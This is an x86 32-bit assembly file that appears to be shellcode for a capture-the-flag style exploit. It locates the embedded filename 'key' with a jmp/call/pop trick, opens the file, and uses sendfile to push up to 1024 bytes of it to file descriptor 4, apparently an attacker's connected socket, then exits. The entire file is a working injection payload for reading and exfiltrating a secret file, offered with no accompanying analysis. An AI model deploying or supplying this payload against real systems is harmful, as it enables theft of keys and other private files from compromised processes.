BITS 32
GLOBAL _start
_start:
    jmp short get_eip
 
run:
    xor eax, eax
    inc eax
    inc eax
    inc eax
    inc eax
    mov edi, eax
    xor edx, edx
 
    ; fd = sys_open(filename, 0, 0)
    mov eax, edi
    inc eax       ; sys_open
    pop ebx       ; filename
    xor ecx, ecx  ; flags = 0
    xor edx, edx  ; mode = 0
    int 0x80

    ; sendfile(int out_fd, int in_fd, off_t *offset, size_t count)
    mov ecx, eax  ; in_fd
    xor eax, eax 
    mov al, 0xbb  ; sendfile() syscall
    mov ebx, edi  ; out_fd
    xor edx, edx  ; offset = 0
    mov esi, edi
    shl esi, 8    ; size (4 << 8 = 1024)
    int 0x80

    ; sys_exit(0)
    xor eax, eax
    mov al, 1 ;exit the shellcode
    xor ebx,ebx
    int 0x80

get_eip:
    call run            ; put address of our message onto the stack
 
filename:
    db 'key', 0x0
